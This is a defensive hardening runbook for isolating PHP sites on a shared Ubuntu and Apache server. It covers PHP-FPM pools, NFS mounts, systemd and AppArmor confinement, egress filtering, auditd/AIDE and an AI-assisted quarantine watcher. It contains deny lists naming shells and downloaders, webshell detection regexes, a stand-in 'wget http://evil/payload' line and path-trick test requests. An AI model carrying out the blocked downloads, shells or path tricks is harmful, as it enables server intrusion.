# Hardening runbook — Ubuntu + Apache + PHP, multi-site

**Goal:** limit horizontal (site-to-site) blast radius so that a compromise of one site cannot read, write, or execute across the others, and so post-exploitation moves (dropping a webshell, pulling a payload, spawning a shell, phoning home) are prevented, contained, and detected.

**Core principle:** never trust a single layer. Each phase below assumes the one before it can fail.

---

## Phase 0 — The foundational decision: one identity per site

Everything downstream depends on this. Today all sites share the `www-data` identity on a filesystem writable by that identity — that is the horizontal-risk root cause. Fix it first.

- [ ] Stop using `mod_php` (it forces all PHP to run as the Apache user). Move to **Apache MPM event + PHP-FPM**.

```bash
apt install php-fpm
a2dismod php8.3 mpm_prefork
a2enmod mpm_event proxy_fcgi setenvif
a2enconf php8.3-fpm
```

- [ ] Create a dedicated, no-login Unix user per site.

```bash
useradd -r -s /usr/sbin/nologin -d /var/www/site1 site1
```

- [ ] Give each site its own PHP-FPM pool running as that user, jailed with `open_basedir`, with dangerous functions disabled. `/etc/php/8.3/fpm/pool.d/site1.conf`:

```ini
[site1]
user = site1
group = site1
listen = /run/php/site1.sock
listen.owner = www-data
listen.group = www-data
php_admin_value[open_basedir]     = /var/www/site1:/tmp/site1
php_admin_value[upload_tmp_dir]   = /tmp/site1
php_admin_value[session.save_path]= /var/www/site1/sessions
php_admin_value[disable_functions]= exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec
```

- [ ] Route each vhost's PHP to that site's socket.

```apache
<FilesMatch \.php$>
    SetHandler "proxy:unix:/run/php/site1.sock|fcgi://localhost"
</FilesMatch>
```

**Check:** a webshell on site1 now runs as `site1`, and `open_basedir` blocks it from reading another site's code through PHP.

---

## Phase 1 — Filesystem permissions (remove shared-writable assumption)

- [ ] Own each tree by its own user; deny everyone else.

```bash
chown -R site1:site1 /var/www/site1
chmod 750 /var/www/site1
```

- [ ] Let Apache serve static files via ACL instead of loosening the mode.

```bash
setfacl -R -m  u:www-data:rX /var/www/site1
setfacl -R -d -m u:www-data:rX /var/www/site1
```

- [ ] **Code must not be writable by the runtime user.** Deploy as a separate deploy/root identity; only real upload/cache/session dirs get group-write for the site user.
- [ ] Mount upload/temp dirs `noexec,nosuid,nodev` (bind-mount or separate partition) so dropped files can't execute.

**Check:** a webshell dropped into a docroot can't overwrite site code and can't be executed from the uploads dir.

> **Note:** if docroots live on NFS (exported by another host), the `setfacl` and local deploy steps above are replaced/adjusted by **Phase 1b** below. Read that before applying Phase 1 to an NFS mount.

---

## Phase 1b — NFS-backed docroots (docroots exported by another host)

Applies when `/var/www/*` is an NFS mount from a separate file server. NFS changes the trust model and the write strategy — done right it is **stronger** than local disk, because code can be mounted read-only.

### Trust model — get this right first

- [ ] **Understand `sec=sys` (AUTH_SYS):** NFS trusts whatever numeric UID the client sends. It is **not an isolation boundary by itself** — inter-site isolation still comes from the client-side per-uid separation (Phase 0). NFS just has to honor those uids and contain client-root.
- [ ] **Identical UID/GID on both hosts.** `site1` must be the same numeric uid/gid on the webserver *and* the NFS server, or permissions are meaningless. Coordinate via matching `/etc/passwd`/`/etc/group` or a central directory (LDAP). Most common NFS foot-gun.
- [ ] **Keep `root_squash` on** (default — never `no_root_squash`). Maps client root → `nobody`, so even a root compromise of the webserver can't override file permissions on the export.
- [ ] **Restrict each export to the webserver's IP**, put NFS on an isolated/private segment, firewall the ports.
- [ ] For genuinely hostile tenants, use **Kerberos** (`sec=krb5i` integrity, or `krb5p` encryption) instead of uid-trust — a real upgrade, operationally heavier.

### Mount code read-only, data read-write (separate exports)

- [ ] Export code and writable data **separately**; mount code `ro`, data `rw`, both `nosuid,nodev,noexec`:

```
# /etc/fstab on the webserver
nfs-host:/export/site1/code     /var/www/site1          nfs  ro,nosuid,nodev,noexec  0 0
nfs-host:/export/site1/uploads  /var/www/site1/uploads  nfs  rw,nosuid,nodev,noexec  0 0
```

- [ ] Read-only code mount = **no webshell can ever be written into the served tree** — replaces the local `chmod 750` + deploy-user dance from Phase 1.
- [ ] `noexec` blocks dropped ELF binaries / miners / shell scripts. **PHP still runs under `noexec`** (php-fpm reads & interprets, doesn't `execve()`). But note `noexec` does **not** stop a PHP webshell (interpreted, not exec'd) — that's handled by the read-only mount + the writable-dir controls below.

### Writable dirs that PHP genuinely needs (php-fpm)

PHP needs write for uploads, cache, compiled templates, framework storage, logs. Carve these out minimally and neuter them so "writable" never means "executable."

- [ ] Enumerate exactly what needs write; everything else stays `ro`. Put writable dirs **outside the docroot** where possible, or serve uploads via a path that never maps to PHP.
- [ ] **Disable PHP in writable dirs the php-fpm way** — unset the fpm handler (do NOT use `php_admin_flag engine off`, that's mod_php only):

```apache
<Directory /var/www/site1/uploads>
    <FilesMatch \.php$>
        SetHandler None
    </FilesMatch>
    Require all denied        # or restrict to static types only
</Directory>
```

Cleaner still: scope the fpm `SetHandler` to the code dir only, so it never applies to `uploads/`.

- [ ] **Close the php-fpm mismatched-script vuln** (Apache passing `photo.jpg/foo.php` or a non-existent script to fpm):

```apache
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule \.php$ - [R=404,L]     # only proxy .php that actually exists
```

- [ ] **Lock fpm to real PHP files** in `pool.d/site1.conf`:

```ini
security.limit_extensions = .php
```

- [ ] Writable dirs owned by the **site uid only** (`chown site1:site1`, mode `750`/`770`); include them in the pool's `open_basedir`.

### Keep churny / includable paths OFF NFS

- [ ] **Sessions, tmp, request-scratch → local per-site disk** (NFS locking is slow and stale-lock-prone). Override the Phase 0 pool values:

```ini
php_admin_value[session.save_path] = /var/local/site1/sessions   # local disk
php_admin_value[upload_tmp_dir]    = /var/local/site1/tmp        # local disk
php_admin_value[open_basedir]      = /var/www/site1:/var/www/site1/uploads:/var/local/site1
```

- [ ] **Compiled template / framework cache → local disk** too. These are often *includable `.php` files*; keep them writable only by that site's uid and out of every other site's reach. Better: precompile at deploy time (`php artisan optimize`, warm template cache) and mount **read-only** so no includable-code path needs runtime write.

### ACLs differ over NFS

- [ ] The `setfacl` (POSIX ACL) step from Phase 1 does **not** travel cleanly over NFS. Check the version: NFSv3 ACL support is a flaky sideband; **NFSv4 uses a different model** (`nfs4_setfacl`/`nfs4_getfacl`, not POSIX). Prefer plain Unix ownership + mode + per-export layout; if you need ACLs, use the NFSv4 tools server-side and test.

### Run detection on the NFS server, not the client

- [ ] Put **AIDE and the file-watcher on the NFS server**, watching the exported tree directly — integrity monitoring then lives *outside* the web tier, so a webserver compromise can't tamper with the baseline or kill the watcher, and the server sees the authoritative filesystem. (Client-side inotify only reliably sees writes made by that same client.)
- [ ] Keep auditd on the webserver for logging *who on the client* wrote what, but treat the server-side record as authoritative.

**Residual risk (acceptable for the horizontal threat model):** a compromise of site1 can still write PHP into site1's own writable cache and get site1's app to include it — but that's within site1's already-compromised blast radius, not lateral movement. site2's writable export is a different export, different uid, engine-off, not writable by site1. Horizontal isolation holds.

---

## Phase 2 — Sandbox the PHP-FPM services (systemd)

- [ ] Prefer **one systemd service per pool** so each gets its own cgroup and its own `ReadWritePaths`. Harden via a drop-in (`systemctl edit php8.3-fpm` or the per-pool unit):

```ini
[Service]
ProtectSystem=strict
ReadWritePaths=/var/www/site1 /run/php /tmp
PrivateTmp=true
ProtectHome=true
NoNewPrivileges=true
ProtectKernelTunables=true
ProtectControlGroups=true
RestrictSUIDSGID=true
SystemCallFilter=@system-service
# containment of spawned processes:
KillMode=control-group      # stopping the pool kills every child it spawned
TasksMax=64                 # fork-bomb / spawn ceiling
MemoryMax=512M
CPUQuota=50%
```

**Check:** `PrivateTmp` kills cross-site `/tmp` leakage; `KillMode=control-group` means an orphaned `wget`/miner dies with the pool.

---

## Phase 3 — Isolate the rest of the stack

- [ ] **Separate DB user + separate database per site**, each grant scoped to only its own schema.
- [ ] Store secrets (DB passwords, API keys) in files owned by the site user, `chmod 600`, **outside** the docroot. Never world-readable.

**Check:** a leaked credential from one site can't read another site's database.

---

## Phase 4 — Block process spawning (AppArmor)

`disable_functions` is PHP-level and bypassable; AppArmor is the kernel-level backstop.

- [ ] Confine php-fpm (and apache) with an enforcing AppArmor profile that denies shells and network tools:

```
deny /usr/bin/wget    mix,
deny /usr/bin/curl    mix,
deny /bin/sh          mix,
deny /bin/dash        mix,
deny /usr/bin/python3 mix,
```

**Check:** even if `disable_functions` is bypassed, exec of a shell/downloader fails at the kernel.

---

## Phase 5 — Block the network (egress by uid) — highest-value control

Because each site has its own uid, filter outbound traffic by owner (nftables/iptables OUTPUT chain).

- [ ] Default-deny egress per site, allow only what it legitimately needs (DNS, DB, package mirror):

```bash
iptables -A OUTPUT -m owner --uid-owner site1 -d <db-ip>        -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner site1 -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner site1                   -j REJECT
```

**Check:** webshell's `wget http://evil/payload`, reverse shells, and miner call-homes all fail regardless of whether the exec succeeded.

---

## Phase 6 — Detection

- [ ] **auditd** (`apt install auditd audispd-plugins`). Rules in `/etc/audit/rules.d/*.rules`:

```
# writes/attribute-changes under docroots
-w /var/www -p wa -k webroot_write
# every command run by a site's identity (with parent + uid)
-a always,exit -F arch=b64 -S execve -F auid=site1 -k site1_exec
```

Query with `ausearch -k webroot_write` / `ausearch -k site1_exec`. Watch **writes** (`wa`), not reads, to keep volume sane. auditd is cross-distro (package is `audit` on RHEL/Arch/SUSE); rule syntax is portable. Linux-only.

- [ ] **AIDE** (`apt install aide`) — daily baseline integrity sweep as the thorough backstop.
  - Tune `aide.conf` selection lines: tightly watch code paths, **exclude** churny dirs (caches, uploads, sessions) to avoid alert fatigue.
  - Store the baseline DB offline / read-only so a compromise can't rewrite it.
  - Re-baseline (`aide --update`) after every legitimate deploy.
  - Behavior: reports **Added / Removed / Changed** on the next scheduled run; detection only, no real-time, no blocking.
- [ ] Optional: **process accounting** (`apt install acct`) → `lastcomm` history of every command and who ran it.
- [ ] If you move to containers: **Falco** — built-in rules for "shell spawned by web server," "unexpected outbound connection," cross-environment, near real-time.

---

## Phase 7 — Real-time watcher + Claude analysis (detect → react)

A near-real-time layer that AIDE lacks. Shape: **watch → quarantine (fail-closed) → analyze → release or alert.**

- [ ] Watch docroots with inotify (Python `watchdog` handles recursion + new subdirs; `incron` or a systemd `.path` unit are lighter triggers). Fire on `CLOSE_WRITE` / `MOVED_TO`, not `CREATE`.
- [ ] **Fail-closed:** on a new `.php/.js/.html`, immediately neutralize (`chmod 000` or move to `/var/quarantine/`) *then* analyze; restore only if cleared. Gate off during deploy windows (`/run/deploy.lock`).
- [ ] Filter by extension in the trigger script; skip `vendor/`, `node_modules/`, `.git/`; debounce bursts; run a cheap pre-filter (entropy, `eval(`/`base64_decode(`/`gzinflate(` regexes) before spending an API call.
- [ ] Analyze with a **pure classifier (Messages API, no tools)** — simpler/cheaper/safer than the full agent. Use Claude Code headless only if you want surrounding-context analysis, and lock it read-only (`--disallowedTools "Write,Edit,Bash"`, `--permission-mode plan`).
- [ ] Return **structured output** (verdict / confidence / indicators) so the service acts programmatically.
- [ ] **Prompt-injection defense:** treat file content as untrusted *data*, clearly delimited, never concatenated into instructions; give the analyzer no tools; don't auto-release on "benign" for high-risk paths.
- [ ] **Isolate the watcher itself:** run as a dedicated user (not `www-data`), API key `chmod 600` outside every docroot, watcher binary/config/quarantine dir not writable by any site user.

---

## Phase 8 — Perimeter & host hygiene (defense-in-depth)

- [ ] **UFW** default-deny inbound except 80/443/SSH.
- [ ] **fail2ban** on SSH and Apache auth.
- [ ] **unattended-upgrades** for security patches; keep PHP/Apache current.
- [ ] **ModSecurity + OWASP CRS** (`libapache2-mod-security2`) as a WAF to reduce initial compromise.
- [ ] **SSH:** key-only, `PermitRootLogin no`, non-standard admin account.
- [ ] **TLS** on all vhosts (Let's Encrypt).

---

## Phase 9 — Stronger isolation option: containers

If sites are truly untrusted from each other, one **container/VM per site** removes the shared-kernel-filesystem assumption entirely instead of partitioning within it.

- [ ] One container per site; each app listens on its own internal port.
- [ ] **One reverse proxy** in front on 80/443 for TLS + host-based routing. You do **not** need nginx specifically — options: your existing **Apache** (`mod_proxy`), nginx, or **Traefik/Caddy** (auto-discovery + automatic TLS, least toil with containers).
- [ ] Inside each container: php-fpm alone, or nginx/apache + php-fpm. **Keep Apache inside if you rely on `.htaccess`** (nginx doesn't read those — the main hidden migration cost).
- [ ] Pair with **Falco** for cross-workload runtime detection.

---

## The end-to-end story (what a compromise now hits, in order)

1. **AppArmor** blocks the shell/downloader exec.
2. **Egress firewall** blocks the payload download / reverse shell / call-home.
3. **noexec + open_basedir + permissions** block executing anything dropped.
4. **auditd / Falco** log the attempt (what ran, which uid, which parent).
5. **cgroup / systemd** caps the blast radius and kills orphaned children.
6. **Claude watcher** flags and quarantines the dropped file in near real time.
7. **AIDE** catches anything missed on the daily sweep.

No single layer is trusted to hold.

---

## Verification pass (do this after building)

- [ ] From a test file placed as `site1`, confirm you **cannot** read `/var/www/site2` (permissions + open_basedir).
- [ ] Attempt `wget` as `site1` → confirm AppArmor denies exec **and** egress firewall rejects the connection.
- [ ] Drop a benign `test.php` into an uploads dir → confirm it's quarantined, analyzed, and (if benign) released; confirm `noexec` prevents execution.
- [ ] Trigger a write under `/var/www` → confirm `ausearch -k webroot_write` shows it.
- [ ] Run `aide --check` → confirm the test file appears under **Added**.
- [ ] Restart a php-fpm pool → confirm any child process it spawned is killed (`KillMode=control-group`).
- [ ] Confirm the watcher's API key and config are not readable/writable by any site user.

**If NFS-backed (Phase 1b):**

- [ ] Confirm `site1` resolves to the **same numeric uid/gid** on the webserver and the NFS server.
- [ ] As `site1`, attempt to write into the **code** mount → must fail (read-only).
- [ ] Attempt to execute a dropped binary from a writable NFS dir → must fail (`noexec`).
- [ ] Request an uploaded `evil.php` from `uploads/` over the web → must be served inert / denied, never interpreted (`SetHandler None` + `security.limit_extensions`).
- [ ] Request `photo.jpg/foo.php` → must return 404, not execute (script-must-exist rewrite).
- [ ] As client root, confirm you **cannot** override file permissions on the export (`root_squash` in effect).
- [ ] Confirm sessions/tmp/compiled cache resolve to **local disk**, not the NFS mount.
```
